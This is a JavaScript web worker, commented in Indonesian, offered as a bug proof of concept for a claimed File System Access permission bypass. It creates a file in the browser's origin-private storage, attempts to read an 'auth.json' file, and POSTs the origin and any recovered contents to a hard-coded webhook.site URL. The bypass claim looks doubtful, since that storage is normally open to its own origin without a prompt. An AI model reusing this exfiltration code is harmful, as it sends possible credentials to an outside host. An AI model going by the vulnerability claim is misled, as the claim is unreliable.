// worker-fsa-bypass.js
self.onmessage = async () => {
  try {
    // 💥 Langkah 1: Dapatkan akses ke file system TANPA IZIN
    const root = await navigator.storage.getDirectory();
    
    // 💥 Langkah 2: Buat file bukti
    const proofFile = await root.getFileHandle('fsa_bypass_proof.txt', { create: true });
    const writer = await proofFile.createWritable();
    const content = `[BUG PROOF]\nOrigin: ${location.origin}\nWaktu: ${new Date().toISOString()}\nStatus: Akses file TANPA IZIN!`;
    await writer.write(content);
    await writer.close();

    // 💥 Langkah 3: Coba baca file lain (jika ada)
    let additionalData = 'Tidak ada file tambahan.';
    try {
      const testFile = await root.getFileHandle('auth.json');
      additionalData = await (await testFile.getFile()).text();
    } catch (e) {
      // Abaikan jika file tidak ada
    }

    // 💥 Langkah 4: Kirim hasil ke webhook (ganti dengan webhook.site mu)
    const report = {
      origin: location.origin,
      proof: 'File fsa_bypass_proof.txt berhasil dibuat',
      extra: additionalData
    };

    // Gunakan webhook.site untuk uji (gratis)
    await fetch('https://webhook.site/49732487-df13-49ee-bf35-33d57106989a', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(report)
    });

    self.postMessage({
      success: true,
      message: '✅ BUG BERHASIL DIBUKTIKAN!',
      origin: location.origin
    });

  } catch (err) {
    self.postMessage({
      success: false,
      message: '❌ Gagal: ' + err.message,
      error: err.toString()
    });
  }
};
